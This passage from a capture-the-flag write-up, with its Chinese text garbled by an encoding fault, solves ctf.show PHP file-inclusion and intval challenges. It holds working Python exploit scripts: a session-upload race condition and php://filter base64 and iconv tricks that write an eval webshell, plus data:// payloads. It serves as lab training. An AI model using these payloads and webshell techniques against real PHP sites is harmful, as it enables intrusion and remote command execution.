<figure class="highlight php"><table><tr><td class="code"><pre><span class="line">session_unset();</span><br><span class="line">session_destroy();</span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>($_GET[<span class="string">&#x27;file&#x27;</span>]))&#123;</span><br><span class="line">    $file = $_GET[<span class="string">&#x27;file&#x27;</span>];</span><br><span class="line">    $file = str_replace(<span class="string">&quot;php&quot;</span>, <span class="string">&quot;???&quot;</span>, $file);</span><br><span class="line">    $file = str_replace(<span class="string">&quot;data&quot;</span>, <span class="string">&quot;???&quot;</span>, $file);</span><br><span class="line">    $file = str_replace(<span class="string">&quot;:&quot;</span>, <span class="string">&quot;???&quot;</span>, $file);</span><br><span class="line">    $file = str_replace(<span class="string">&quot;.&quot;</span>, <span class="string">&quot;???&quot;</span>, $file);</span><br><span class="line"></span><br><span class="line">    <span class="keyword">include</span>($file);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>ç»§ç»­åˆ©ç”¨sessionæ–‡ä»¶åŒ…å«ï¼Œä½¿ç”¨ä¸Šé¢˜è„šæœ¬è¿è¡Œå³å¯å¾—åˆ°flag</p>
<h3 id="web84"><a class="header-anchor" href="#web84">Â¶</a>web84</h3>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>($_GET[<span class="string">&#x27;file&#x27;</span>]))&#123;</span><br><span class="line">    $file = $_GET[<span class="string">&#x27;file&#x27;</span>];</span><br><span class="line">    $file = str_replace(<span class="string">&quot;php&quot;</span>, <span class="string">&quot;???&quot;</span>, $file);</span><br><span class="line">    $file = str_replace(<span class="string">&quot;data&quot;</span>, <span class="string">&quot;???&quot;</span>, $file);</span><br><span class="line">    $file = str_replace(<span class="string">&quot;:&quot;</span>, <span class="string">&quot;???&quot;</span>, $file);</span><br><span class="line">    $file = str_replace(<span class="string">&quot;.&quot;</span>, <span class="string">&quot;???&quot;</span>, $file);</span><br><span class="line">    system(<span class="string">&quot;rm -rf /tmp/*&quot;</span>);</span><br><span class="line">    <span class="keyword">include</span>($file);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>åŠ äº†ä¸€ä¸ª<code>rm -rf</code>ï¼Œä½†æ²¡å…³ç³»ï¼Œæˆ‘ä»¬æ˜¯æ¡ä»¶ç«äº‰ï¼Œåªè¦ä¸€ç›´ä¼ å°±æœ‰æœºä¼šèƒ½æ‰§è¡Œï¼Œç»§ç»­è·‘ä¸Šé¢çš„è„šæœ¬æ‹¿flag</p>
<h3 id="web85"><a class="header-anchor" href="#web85">Â¶</a>web85</h3>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>($_GET[<span class="string">&#x27;file&#x27;</span>]))&#123;</span><br><span class="line">    $file = $_GET[<span class="string">&#x27;file&#x27;</span>];</span><br><span class="line">    $file = str_replace(<span class="string">&quot;php&quot;</span>, <span class="string">&quot;???&quot;</span>, $file);</span><br><span class="line">    $file = str_replace(<span class="string">&quot;data&quot;</span>, <span class="string">&quot;???&quot;</span>, $file);</span><br><span class="line">    $file = str_replace(<span class="string">&quot;:&quot;</span>, <span class="string">&quot;???&quot;</span>, $file);</span><br><span class="line">    $file = str_replace(<span class="string">&quot;.&quot;</span>, <span class="string">&quot;???&quot;</span>, $file);</span><br><span class="line">    <span class="keyword">if</span>(file_exists($file))&#123;</span><br><span class="line">        $content = file_get_contents($file);</span><br><span class="line">        <span class="keyword">if</span>(strpos($content, <span class="string">&quot;&lt;&quot;</span>)&gt;<span class="number">0</span>)&#123;</span><br><span class="line">            <span class="keyword">die</span>(<span class="string">&quot;error&quot;</span>);</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">include</span>($file);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>è¿™æ¬¡ä¼šåŒ¹é…è°ƒç”¨dieï¼Œæˆ‘ä»¬ä¾ç„¶ä½¿ç”¨æ¡ä»¶ç«äº‰è¿›è¡Œpassï¼Œä¸è¿‡è¿™æ¬¡æˆ‘ä»¬å¤šåŠ ç‚¹çº¿ç¨‹</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="comment">#-- coding:UTF-8 --</span></span><br><span class="line"><span class="comment"># Author:dota_st</span></span><br><span class="line"><span class="comment"># Date:2021/2/20 23:51</span></span><br><span class="line"><span class="comment"># blog: www.wlhhlc.top</span></span><br><span class="line"><span class="keyword">import</span> io</span><br><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"><span class="keyword">import</span> threading</span><br><span class="line">url = <span class="string">&#x27;http://8c42100f-3744-4c9f-83d4-5ac626e78719.chall.ctf.show:8080/&#x27;</span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">write</span>(<span class="params">session</span>):</span></span><br><span class="line">    data = &#123;</span><br><span class="line">        <span class="string">&#x27;PHP_SESSION_UPLOAD_PROGRESS&#x27;</span>: <span class="string">&#x27;&lt;?php system(&quot;tac f*&quot;);?&gt;dotast&#x27;</span></span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">while</span> <span class="literal">True</span>:</span><br><span class="line">        f = io.BytesIO(<span class="string">b&#x27;a&#x27;</span> * <span class="number">1024</span> * <span class="number">10</span>)</span><br><span class="line">        response = session.post(url,cookies=&#123;<span class="string">&#x27;PHPSESSID&#x27;</span>: <span class="string">&#x27;flag&#x27;</span>&#125;, data=data, files=&#123;<span class="string">&#x27;file&#x27;</span>: (<span class="string">&#x27;dota.txt&#x27;</span>, f)&#125;)</span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">read</span>(<span class="params">session</span>):</span></span><br><span class="line">    <span class="keyword">while</span> <span class="literal">True</span>:</span><br><span class="line">        response = session.get(url+<span class="string">&#x27;?file=/tmp/sess_flag&#x27;</span>)</span><br><span class="line">        <span class="keyword">if</span> <span class="string">&#x27;dotast&#x27;</span> <span class="keyword">in</span> response.text:</span><br><span class="line">            print(response.text)</span><br><span class="line">            <span class="keyword">break</span></span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">            print(<span class="string">&#x27;retry&#x27;</span>)</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">&#x27;__main__&#x27;</span>:</span><br><span class="line">    session = requests.session()</span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">30</span>):</span><br><span class="line">        threading.Thread(target=write, args=(session,)).start()</span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">30</span>):</span><br><span class="line">        threading.Thread(target=read, args=(session,)).start()</span><br></pre></td></tr></table></figure>
<p>è¿è¡Œåå¾—åˆ°flag</p>
<h3 id="web86"><a class="header-anchor" href="#web86">Â¶</a>web86</h3>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line">define(<span class="string">&#x27;è¿˜è¦ç§€ï¼Ÿ&#x27;</span>, dirname(<span class="keyword">__FILE__</span>));</span><br><span class="line">set_include_path(è¿˜è¦ç§€ï¼Ÿ);</span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>($_GET[<span class="string">&#x27;file&#x27;</span>]))&#123;</span><br><span class="line">    $file = $_GET[<span class="string">&#x27;file&#x27;</span>];</span><br><span class="line">    $file = str_replace(<span class="string">&quot;php&quot;</span>, <span class="string">&quot;???&quot;</span>, $file);</span><br><span class="line">    $file = str_replace(<span class="string">&quot;data&quot;</span>, <span class="string">&quot;???&quot;</span>, $file);</span><br><span class="line">    $file = str_replace(<span class="string">&quot;:&quot;</span>, <span class="string">&quot;???&quot;</span>, $file);</span><br><span class="line">    $file = str_replace(<span class="string">&quot;.&quot;</span>, <span class="string">&quot;???&quot;</span>, $file);</span><br><span class="line">    <span class="keyword">include</span>($file);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>ç»§ç»­ä½¿ç”¨ä¸Šé¢˜è„šæœ¬è·‘ï¼Œè·‘å®Œå¾—åˆ°flag</p>
<h3 id="web87"><a class="header-anchor" href="#web87">Â¶</a>web87</h3>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>($_GET[<span class="string">&#x27;file&#x27;</span>]))&#123;</span><br><span class="line">    $file = $_GET[<span class="string">&#x27;file&#x27;</span>];</span><br><span class="line">    $content = $_POST[<span class="string">&#x27;content&#x27;</span>];</span><br><span class="line">    $file = str_replace(<span class="string">&quot;php&quot;</span>, <span class="string">&quot;???&quot;</span>, $file);</span><br><span class="line">    $file = str_replace(<span class="string">&quot;data&quot;</span>, <span class="string">&quot;???&quot;</span>, $file);</span><br><span class="line">    $file = str_replace(<span class="string">&quot;:&quot;</span>, <span class="string">&quot;???&quot;</span>, $file);</span><br><span class="line">    $file = str_replace(<span class="string">&quot;.&quot;</span>, <span class="string">&quot;???&quot;</span>, $file);</span><br><span class="line">    file_put_contents(urldecode($file), <span class="string">&quot;&lt;?php die(&#x27;å¤§ä½¬åˆ«ç§€äº†&#x27;);?&gt;&quot;</span>.$content);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>åˆ†æä¸€ä¸‹æºç ï¼Œgetä¼ å…¥fileï¼Œpostä¼ å…¥contentï¼Œä½†<code>$content</code>åœ¨å¼€å¤´å¢åŠ äº†dieå‡½æ•°ï¼Œå³ä½¿æˆ‘ä»¬å†™å…¥ä¸€å¥è¯ä¹Ÿä¼šå…ˆdieï¼Œå¯¼è‡´æ— æ³•æ‰§è¡Œï¼›å¹¶ä¸”è¿˜å¯¹<code>file</code>è¿›è¡Œäº†urlè§£ç <br>
æˆ‘ä»¬å¯ä»¥ä½¿ç”¨base64çš„æ–¹å¼å†™å…¥æ–‡ä»¶å†è¿›è¡Œdecodeï¼Œbase64ç¼–ç åªåŒ…å«64ä¸ªå¯æ‰“å°å­—ç¬¦ï¼Œè€Œphpè§£ç base64æ—¶é‡åˆ°ä¸åœ¨å…¶ä¸­çš„å­—ç¬¦ï¼Œä¼šå¿½ç•¥æ‰ï¼Œå°†åˆæ³•å­—ç¬¦è¿›è¡Œç»„åˆå˜æˆä¸€ä¸ªå­—ç¬¦ä¸²è¿›è¡Œè§£ç ï¼Œæ‰€ä»¥<code>&lt;?php die('å¤§ä½¬åˆ«ç§€äº†');?&gt;</code>å¯¹å…¶è§£ç åï¼Œåªæœ‰<code>phpdie</code>å…­ä¸ªå­—ç¬¦ç»„æˆå­—ç¬¦ä¸²è¿›è¡Œè§£ç ï¼Œæ€è·¯å·²ç»å¾ˆæ¸…æ™°äº†ï¼Œä¸‹é¢è®²è®²æ€ä¹ˆåš</p>
<blockquote>
<p>ç¬¬ä¸€ï¼Œgetä¼ å‚fileå†™å…¥æ–‡ä»¶å¹¶ä¸”è¿›è¡Œbase64è§£ç ï¼Œå³<br>
?file=php://filter/write=convert.base64-decode/resource=datast.php<br>
å› ä¸ºæºç ä¸­æœ‰ä¸€æ¬¡urldecodeï¼Œæ‰€ä»¥æˆ‘ä»¬éœ€è¦å¯¹å…¶è¿›è¡Œä¸¤æ¬¡urlç¼–ç <br>
%25%37%30%25%36%38%25%37%30%25%33%41%25%32%46%25%32%46%25%36%36%25%36%39%25%36%43%25%37%34%25%36%35%25%37%32%25%32%46%25%37%37%25%37%32%25%36%39%25%37%34%25%36%35%25%33%44%25%36%33%25%36%46%25%36%45%25%37%36%25%36%35%25%37%32%25%37%34%25%32%45%25%36%32%25%36%31%25%37%33%25%36%35%25%33%36%25%33%34%25%32%44%25%36%34%25%36%35%25%36%33%25%36%46%25%36%34%25%36%35%25%32%46%25%37%32%25%36%35%25%37%33%25%36%46%25%37%35%25%37%32%25%36%33%25%36%35%25%33%44%25%36%34%25%36%31%25%37%34%25%36%31%25%37%33%25%37%34%25%32%45%25%37%30%25%36%38%25%37%30</p>
<p>ç¬¬äºŒï¼Œpostä¼ å‚contentä¸ºbase64ç¼–ç åçš„ä¸€å¥è¯æœ¨é©¬ï¼Œä½†æ³¨æ„çš„æ˜¯å‰é¢å‰©ä¸‹phpdieï¼Œä¸€å…±6ä¸ªå­—ç¬¦ï¼Œæ‰€ä»¥éœ€è¦å†åŠ 2ä¸ªå­—ç¬¦å˜8ä¸ª<br>
å› ä¸ºbase64ç®—æ³•è§£ç æ—¶æ˜¯4ä¸ªbyteä¸€ç»„<br>
content=nbPD9waHAgQGV2YWwoJF9QT1NUW3Bhc3NdKTs/Pg==</p>
</blockquote>
<p>postå‘é€è¯·æ±‚åè®¿é—®dotast.phpå‘ç°ä¸€å¥è¯æœ¨é©¬å·²ç»å†™å…¥ï¼Œå¯ä»¥æ‰§è¡Œå‘½ä»¤ã€‚æ­¥éª¤è¿‡äºç¹çï¼Œæˆ‘å†™ä¸€ä¸ªè„šæœ¬æ¥å®Œæˆ</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="comment">#-- coding:UTF-8 --</span></span><br><span class="line"><span class="comment"># Author:dota_st</span></span><br><span class="line"><span class="comment"># Date:2021/2/21 12:29</span></span><br><span class="line"><span class="comment"># blog: www.wlhhlc.top</span></span><br><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"></span><br><span class="line">url = <span class="string">&quot;http://67365af2-c5a6-4b3c-8900-25c85ed1d8cc.chall.ctf.show:8080/&quot;</span></span><br><span class="line"><span class="comment">#ç»è¿‡ä¸¤æ¬¡urlç¼–ç çš„php://filter/write=convert.base64-decode/resource=dotast.php</span></span><br><span class="line">get_data = <span class="string">&quot;%25%37%30%25%36%38%25%37%30%25%33%41%25%32%46%25%32%46%25%36%36%25%36%39%25%36%43%25%37%34%25%36%35%25%37%32%25%32%46%25%37%37%25%37%32%25%36%39%25%37%34%25%36%35%25%33%44%25%36%33%25%36%46%25%36%45%25%37%36%25%36%35%25%37%32%25%37%34%25%32%45%25%36%32%25%36%31%25%37%33%25%36%35%25%33%36%25%33%34%25%32%44%25%36%34%25%36%35%25%36%33%25%36%46%25%36%34%25%36%35%25%32%46%25%37%32%25%36%35%25%37%33%25%36%46%25%37%35%25%37%32%25%36%33%25%36%35%25%33%44%25%36%34%25%36%31%25%37%34%25%36%31%25%37%33%25%37%34%25%32%45%25%37%30%25%36%38%25%37%30&quot;</span></span><br><span class="line">get_url = url + <span class="string">&quot;?file=&quot;</span> + get_data</span><br><span class="line">data = &#123;</span><br><span class="line">    <span class="string">&#x27;content&#x27;</span>: <span class="string">&#x27;nbPD9waHAgQGV2YWwoJF9QT1NUW3Bhc3NdKTs/Pg==&#x27;</span></span><br><span class="line">&#125;</span><br><span class="line">res = requests.post(url=get_url, data=data)</span><br><span class="line">shell_url = url + <span class="string">&quot;dotast.php&quot;</span></span><br><span class="line">test = requests.get(shell_url)</span><br><span class="line"><span class="keyword">if</span>(test.status_code == <span class="number">200</span>):</span><br><span class="line">    print(<span class="string">&quot;[*]getshellæˆåŠŸ&quot;</span>)</span><br><span class="line">    shell_data = &#123;</span><br><span class="line">        <span class="string">&#x27;pass&#x27;</span>: <span class="string">&#x27;system(&quot;cat fl0g.php&quot;);&#x27;</span></span><br><span class="line">    &#125;</span><br><span class="line">    result = requests.post(url=shell_url, data=shell_data)</span><br><span class="line">    print(result.text)</span><br></pre></td></tr></table></figure>
<p>è¿è¡Œåå³å¯å¾—åˆ°flag</p>
<h3 id="web88"><a class="header-anchor" href="#web88">Â¶</a>web88</h3>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>($_GET[<span class="string">&#x27;file&#x27;</span>]))&#123;</span><br><span class="line">    $file = $_GET[<span class="string">&#x27;file&#x27;</span>];</span><br><span class="line">    <span class="keyword">if</span>(preg_match(<span class="string">&quot;/php|\~|\!|\@|\#|\\$|\%|\^|\&amp;|\*|\(|\)|\-|\_|\+|\=|\./i&quot;</span>, $file))&#123;</span><br><span class="line">        <span class="keyword">die</span>(<span class="string">&quot;error&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">include</span>($file);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>å€’æ˜¯å˜å¾—ç®€å•äº†ï¼Œè¿‡æ»¤äº†phpï¼Œä½†æ²¡è¿‡æ»¤dataï¼Œæ‰€ä»¥ä½¿ç”¨dataä¼ªåè®®ï¼Œä½†å› ä¸ºè¿‡æ»¤äº†phpæ‰€ä»¥æˆ‘ä»¬ä½¿ç”¨base64ç¼–ç ä¸€ä¸‹<br>
payloadå¦‚ä¸‹</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">?file&#x3D;data:&#x2F;&#x2F;text&#x2F;plain;base64,PD9waHAgc3lzdGVtKCd0YWMgZmwwZy5waHAnKTsgPz4</span><br></pre></td></tr></table></figure>
<h3 id="web116"><a class="header-anchor" href="#web116">Â¶</a>web116</h3>
<p>é¢˜ç›®æç¤ºæ˜¯lfiï¼Œä¹Ÿå°±æ˜¯phpæœ¬åœ°æ–‡ä»¶åŒ…å«æ¼æ´ï¼Œæ‰“å¼€é¢˜ç›®ï¼Œæ˜¯ä¸€ä¸ªè§†é¢‘ï¼Œæ˜¯æ¸¯ç‰‡ç”µå½±åˆé›†çš„æ··å‰ªï¼Œé¥¶æœ‰å…´è¶£çš„çœ‹å®Œäº†ğŸ˜†<br>
<img src="https://blog-file-1302856486.cos.ap-guangzhou.myqcloud.com/Web1000%28%E4%B8%80%29/%E6%96%87%E4%BB%B6%E5%8C%85%E5%90%AB/web116/2%7D%40E%5DTLC4S_U0C8%28UEZ%25UWQ.png" alt=""><br>
ç›´æ¥è¯•äº†ä¸€ä¸‹fileå‚æ•°åŒ…å«è·¯å¾„ï¼Œå°±å‡ºæ¥äº†æºç <br>
<img src="https://blog-file-1302856486.cos.ap-guangzhou.myqcloud.com/Web1000%28%E4%B8%80%29/%E6%96%87%E4%BB%B6%E5%8C%85%E5%90%AB/web116/Y%40VCXO2K%2556I%7BHVG%5D67F3%24B.png" alt=""></p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">error_reporting(<span class="number">0</span>);</span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">filter</span>(<span class="params">$x</span>)</span>&#123;</span><br><span class="line">    <span class="keyword">if</span>(preg_match(<span class="string">&#x27;/http|https|data|input|rot13|base64|string|log|sess/i&#x27;</span>,$x))&#123;</span><br><span class="line">        <span class="keyword">die</span>(<span class="string">&#x27;too young too simple sometimes naive!&#x27;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line">$file=<span class="keyword">isset</span>($_GET[<span class="string">&#x27;file&#x27;</span>])?$_GET[<span class="string">&#x27;file&#x27;</span>]:<span class="string">&quot;5.mp4&quot;</span>;</span><br><span class="line">filter($file);</span><br><span class="line">header(<span class="string">&#x27;Content-Type: video/mp4&#x27;</span>);</span><br><span class="line">header(<span class="string">&quot;Content-Length: <span class="subst">$file</span>&quot;</span>);</span><br><span class="line">readfile($file);</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>
<p>ç›´æ¥åŒ…å«flagå°±å‡ºæ¥äº†<br>
<img src="https://blog-file-1302856486.cos.ap-guangzhou.myqcloud.com/Web1000%28%E4%B8%80%29/%E6%96%87%E4%BB%B6%E5%8C%85%E5%90%AB/web116/9B%40%5B8%246KWLQ%60%5B%28WD~%5DU8%7D7A.png" alt=""></p>
<h3 id="web117"><a class="header-anchor" href="#web117">Â¶</a>web117</h3>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">highlight_file(<span class="keyword">__FILE__</span>);</span><br><span class="line">error_reporting(<span class="number">0</span>);</span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">filter</span>(<span class="params">$x</span>)</span>&#123;</span><br><span class="line">    <span class="keyword">if</span>(preg_match(<span class="string">&#x27;/http|https|utf|zlib|data|input|rot13|base64|string|log|sess/i&#x27;</span>,$x))&#123;</span><br><span class="line">        <span class="keyword">die</span>(<span class="string">&#x27;too young too simple sometimes naive!&#x27;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line">$file=$_GET[<span class="string">&#x27;file&#x27;</span>];</span><br><span class="line">$contents=$_POST[<span class="string">&#x27;contents&#x27;</span>];</span><br><span class="line">filter($file);</span><br><span class="line">file_put_contents($file, <span class="string">&quot;&lt;?php die();?&gt;&quot;</span>.$contents); </span><br></pre></td></tr></table></figure>
<p>è¿™é¢˜å’Œå‰é¢çš„æœ‰ç‚¹ç±»ä¼¼ï¼Œä¹Ÿæ˜¯ç»•è¿‡contentså‰é¢çš„æ­»äº¡ä»£ç ï¼Œåªæ˜¯æŠŠä¸€äº›å¯åˆ©ç”¨çš„åè®®å’Œç¼–ç ç»™banäº†ï¼Œä½†è¿˜å¯ä»¥åˆ©ç”¨å…¶å®ƒç¼–ç å™¨è¿›è¡Œç»•è¿‡</p>
<blockquote>
<p>convert.iconv.ï¼šä¸€ç§è¿‡æ»¤å™¨ï¼Œå’Œä½¿ç”¨iconv()å‡½æ•°å¤„ç†æµæ•°æ®æœ‰ç­‰åŒä½œç”¨<br>
<code>iconv ( string $in_charset , string $out_charset , string $str )</code>ï¼šå°†å­—ç¬¦ä¸²<code>$str</code>ä»<code>in_charset</code>ç¼–ç è½¬æ¢åˆ°<code>$out_charset</code><br>
è¿™é‡Œå¼•å…¥usc-2çš„æ¦‚å¿µï¼Œä½œç”¨æ˜¯å¯¹ç›®æ ‡å­—ç¬¦ä¸²æ¯ä¸¤ä½è¿›è¡Œä¸€åè½¬ï¼Œå€¼å¾—æ³¨æ„çš„æ˜¯ï¼Œå› ä¸ºæ˜¯ä¸¤ä½æ‰€ä»¥å­—ç¬¦ä¸²éœ€è¦ä¿æŒåœ¨å¶æ•°ä½ä¸Š</p>
</blockquote>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line">$result = iconv(<span class="string">&quot;UCS-2LE&quot;</span>,<span class="string">&quot;UCS-2BE&quot;</span>, <span class="string">&#x27;&lt;?php @eval($_POST[dotast]);?&gt;&#x27;</span>);</span><br><span class="line"><span class="keyword">echo</span> <span class="string">&quot;ç»è¿‡ä¸€æ¬¡åè½¬:&quot;</span>.$result.<span class="string">&quot;\n&quot;</span>;</span><br><span class="line"><span class="keyword">echo</span> <span class="string">&quot;ç»è¿‡ç¬¬äºŒæ¬¡åè½¬:&quot;</span>.iconv(<span class="string">&quot;UCS-2LE&quot;</span>,<span class="string">&quot;UCS-2BE&quot;</span>, $result);</span><br><span class="line"></span><br><span class="line"><span class="comment">//è¾“å‡ºç»“æœå¦‚ä¸‹ï¼š</span></span><br><span class="line"><span class="comment">//ç»è¿‡ä¸€æ¬¡åè½¬:?&lt;hp pe@av(l_$OPTSd[tosa]t;)&gt;?</span></span><br><span class="line"><span class="comment">//ç»è¿‡ç¬¬äºŒæ¬¡åè½¬:<span class="meta">&lt;?php</span> @eval($_POST[dotast]);<span class="meta">?&gt;</span></span></span><br></pre></td></tr></table></figure>
<p>å¯ä»¥çœ‹åˆ°ï¼Œç»è¿‡ä¸¤æ¬¡åè½¬ä¹‹åä»£ç åˆç»„è£…å›æ¥ï¼Œæ€è·¯å°±æ˜¯ç”¨ç»è¿‡ä¸€æ¬¡åè½¬åçš„webshellå’Œæ­»äº¡ä»£ç <code>&lt;?php die();?&gt;</code>ä¸€èµ·ç»„åˆä¹‹åï¼Œç»è¿‡ç¬¬äºŒæ¬¡åè½¬æˆ‘ä»¬çš„webshellå°±æ¢å¤æ­£å¸¸äº†ï¼Œè€Œæ­»äº¡ä»£ç ä¼šè¢«åè½¬æ‰“ä¹±ä¸èƒ½æ‰§è¡Œ<br>
æ‰€ä»¥payloadä¹Ÿå°±å‡ºæ¥äº†ï¼ŒæŠŠå‰é¢çš„è„šæœ¬æ”¹ä¸€ä¸‹å³å¯</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="comment">#-- coding:UTF-8 --</span></span><br><span class="line"><span class="comment"># Author:dota_st</span></span><br><span class="line"><span class="comment"># Date:2021/2/21 12:29</span></span><br><span class="line"><span class="comment"># blog: www.wlhhlc.top</span></span><br><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"></span><br><span class="line">url = <span class="string">&quot;http://8a412388-9727-4ea0-8b0d-1f144f2d1a87.chall.ctf.show:8080/&quot;</span></span><br><span class="line">get_data = <span class="string">&quot;php://filter/convert.iconv.UCS-2LE.UCS-2BE/resource=dotast.php&quot;</span></span><br><span class="line">get_url = url + <span class="string">&quot;?file=&quot;</span> + get_data</span><br><span class="line">data = &#123;</span><br><span class="line">    <span class="string">&#x27;contents&#x27;</span>: <span class="string">&#x27;?&lt;hp pe@av(l_$OPTSd[tosa]t;)&gt;?&#x27;</span></span><br><span class="line">&#125;</span><br><span class="line">res = requests.post(url=get_url, data=data)</span><br><span class="line">shell_url = url + <span class="string">&quot;dotast.php&quot;</span></span><br><span class="line">test = requests.get(shell_url)</span><br><span class="line"><span class="keyword">if</span>(test.status_code == <span class="number">200</span>):</span><br><span class="line">    print(<span class="string">&quot;[*]getshellæˆåŠŸ&quot;</span>)</span><br><span class="line">    shell_data = &#123;</span><br><span class="line">        <span class="string">&#x27;dotast&#x27;</span>: <span class="string">&#x27;system(&quot;cat flag.php&quot;);&#x27;</span></span><br><span class="line">    &#125;</span><br><span class="line">    result = requests.post(url=shell_url, data=shell_data)</span><br><span class="line">    print(result.text)</span><br></pre></td></tr></table></figure>
<p>è¿è¡Œåå¾—åˆ°flag</p>
<h2 id="phpç‰¹æ€§-89-115-123-125-150"><a class="header-anchor" href="#phpç‰¹æ€§-89-115-123-125-150">Â¶</a>phpç‰¹æ€§(89-115&amp;123&amp;125-150)</h2>
<h3 id="web89"><a class="header-anchor" href="#web89">Â¶</a>web89</h3>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="keyword">include</span>(<span class="string">&quot;flag.php&quot;</span>);</span><br><span class="line">highlight_file(<span class="keyword">__FILE__</span>);</span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>($_GET[<span class="string">&#x27;num&#x27;</span>]))&#123;</span><br><span class="line">    $num = $_GET[<span class="string">&#x27;num&#x27;</span>];</span><br><span class="line">    <span class="keyword">if</span>(preg_match(<span class="string">&quot;/[0-9]/&quot;</span>, $num))&#123;</span><br><span class="line">        <span class="keyword">die</span>(<span class="string">&quot;no no no!&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">if</span>(intval($num))&#123;</span><br><span class="line">        <span class="keyword">echo</span> $flag;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<blockquote>
<p><strong>intval()</strong> å‡½æ•°ç”¨äºè·å–å˜é‡çš„æ•´æ•°å€¼ã€‚</p>
<p><strong>intval()</strong> å‡½æ•°é€šè¿‡ä½¿ç”¨æŒ‡å®šçš„è¿›åˆ¶ base è½¬æ¢ï¼ˆé»˜è®¤æ˜¯åè¿›åˆ¶ï¼‰ï¼Œè¿”å›å˜é‡ var çš„ integer æ•°å€¼ã€‚ intval() ä¸èƒ½ç”¨äº objectï¼Œå¦åˆ™ä¼šäº§ç”Ÿ E_NOTICE é”™è¯¯å¹¶è¿”å› 1ã€‚</p>
</blockquote>
<p>é¦–å…ˆç¬¬ä¸€ä¸ªifåˆ¤æ–­æœ‰æ— å‚æ•°numï¼Œç¬¬äºŒä¸ªifæ­£åˆ™åŒ¹é…æœ‰æ²¡æœ‰æ•°å­—ï¼Œç¬¬ä¸‰ä¸ªifå¦‚æœèƒ½ä¸º1çš„è¯ï¼Œå°±å¯æ‰§è¡Œifé‡Œçš„è¯­å¥ï¼Œè€Œintvalå‡½æ•°ç”¨äºobjectæ—¶ä¼šå‘ç”Ÿé”™è¯¯å¹¶è¿”å›1ï¼Œæ‰€ä»¥payloadä¸º</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">?num[]&#x3D;1</span><br></pre></td></tr></table></figure>
<h3 id="web90"><a class="header-anchor" href="#web90">Â¶</a>web90</h3>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="keyword">include</span>(<span class="string">&quot;flag.php&quot;</span>);</span><br><span class="line">highlight_file(<span class="keyword">__FILE__</span>);</span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>($_GET[<span class="string">&#x27;num&#x27;</span>]))&#123;</span><br><span class="line">    $num = $_GET[<span class="string">&#x27;num&#x27;</span>];</span><br><span class="line">    <span class="keyword">if</span>($num===<span class="string">&quot;4476&quot;</span>)&#123;</span><br><span class="line">        <span class="keyword">die</span>(<span class="string">&quot;no no no!&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">if</span>(intval($num,<span class="number">0</span>)===<span class="number">4476</span>)&#123;</span><br><span class="line">        <span class="keyword">echo</span> $flag;</span><br><span class="line">    &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">        <span class="keyword">echo</span> intval($num,<span class="number">0</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125; </span><br></pre></td></tr></table></figure>
<p>ç»§ç»­è€ƒå¯Ÿintvalçš„ä½¿ç”¨ï¼Œå¤šè¡¥å……ç‚¹çŸ¥è¯†</p>
<blockquote>
<p>int intval ( mixed $var [, int $base = 10 ] )</p>
<p>å¦‚æœ base æ˜¯ 0ï¼Œé€šè¿‡æ£€æµ‹ var çš„æ ¼å¼æ¥å†³å®šä½¿ç”¨çš„è¿›åˆ¶ï¼š</p>
<ul>
